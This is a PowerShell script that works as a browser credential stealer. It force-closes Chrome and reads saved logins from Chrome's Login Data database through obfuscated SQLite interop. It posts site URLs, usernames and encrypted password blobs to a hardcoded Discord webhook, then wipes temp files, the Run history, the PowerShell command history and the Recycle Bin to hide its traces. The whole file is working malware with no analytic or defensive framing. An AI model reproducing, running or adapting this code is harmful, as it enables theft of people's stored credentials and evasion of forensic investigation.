$DiscordWebhookURL = "https://discord.com/api/webhooks/1358155811704017077/FjjsaYnvKE_FDDC7QDe0N2jl6X0RsKwPyjcbDhEaHcXst--8AJJlZ3TrbMRuRmhV_wfL"
$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"

function Send-MessageToDiscord {
    param (
        [string]$Message
    )
    
    $body = @{
        content = $Message
    } | ConvertTo-Json

    $headers = @{
        "Content-Type" = "application/json"
    }

    try {
        Invoke-RestMethod -Uri $DiscordWebhookURL -Method Post -Body $body -Headers $headers
    } catch {
        Write-Host "Error sending message to Discord webhook: $_"
    }
}

Stop-Process -Name Chrome -Force -ErrorAction SilentlyContinue

$d = Add-Type -A System.Security
$p = 'public static'
$g = """)]$p extern"
$i = '[DllImport("winsqlite3",EntryPoint="sqlite3_'
$m = "[MarshalAs(UnmanagedType.LP"
$q = '(s,i)'
$f = '(p s,int i)'
$z = $env:LOCALAPPDATA + '\Google\Chrome\User Data'
$u = [Security.Cryptography.ProtectedData]
Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"
$s = [W]::O("$z\\Default\\Login Data", [ref]$d)
$l = @()

if ($host.Version -like "7*") {
    $b = (gc "$z\\Local State" | ConvertFrom-Json).os_crypt.encrypted_key
    $x = [Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.length-1)], $n, 0))
}

$_ = [W]::P($d, "SELECT * FROM logins WHERE blacklisted_by_user = 0", -1, [ref]$s, 0)

for (; !([W]::S($s) % 100);) {
    $l += [W]::T($s, 0), [W]::T($s, 3)
    $c = [W]::B($s, 5)  # Encrypted password

    # No decryption logic here; just send the encrypted password
    $encryptedPasswordBase64 = [Convert]::ToBase64String($c)  # Convert encrypted password to base64 for readability

    # Append the information to be sent
    $l += "Website: $( [W]::T($s, 0) ), Username: $( [W]::T($s, 3) ), Encrypted Password (Base64): $encryptedPasswordBase64"
}

# Convert the message into a single string
$allCredentialsMessage = $l -join "`n"

# Max length for Discord message (Discord API limit is 2000 characters)
$maxLength = 2000

# Split the message into chunks if it exceeds the max length
$chunks = [System.Collections.ArrayList]@()
while ($allCredentialsMessage.Length -gt $maxLength) {
    $chunks.Add($allCredentialsMessage.Substring(0, $maxLength))
    $allCredentialsMessage = $allCredentialsMessage.Substring($maxLength)
}
$chunks.Add($allCredentialsMessage)  # Add the remaining part of the message

# Send each chunk as a separate message with a delay to avoid rate limits
foreach ($chunk in $chunks) {
    Send-MessageToDiscord $chunk
    # Add a random delay between 1 and 2 seconds to avoid rate limits
    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 2)
}

Send-MessageToDiscord "Chrome restarted successfully."

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

Send-MessageToDiscord "Cleanup completed. Traces removed."
